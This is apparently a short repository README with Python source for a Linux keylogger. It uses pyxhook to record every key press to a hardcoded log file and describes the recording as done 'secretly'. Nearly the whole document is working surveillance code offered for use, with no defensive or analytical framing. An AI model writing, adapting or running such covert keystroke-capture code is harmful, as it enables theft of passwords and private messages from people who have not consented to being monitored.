# keylogger
simple keylogger in which all you keyboard activities will be saved in a log file secretly.


import pyxhook
#change this to your log file's path
log_file='/home/wavenet/Desktop/mrinal/file.log'

#this function is called everytime a key is pressed. onekeypress is the function which execute evrytime a key i9s pressed.
def OnKeyPress(event):
  act=open(log_file,'a')
  act.write(event.Key)
  act.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key
    act.close()
    new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
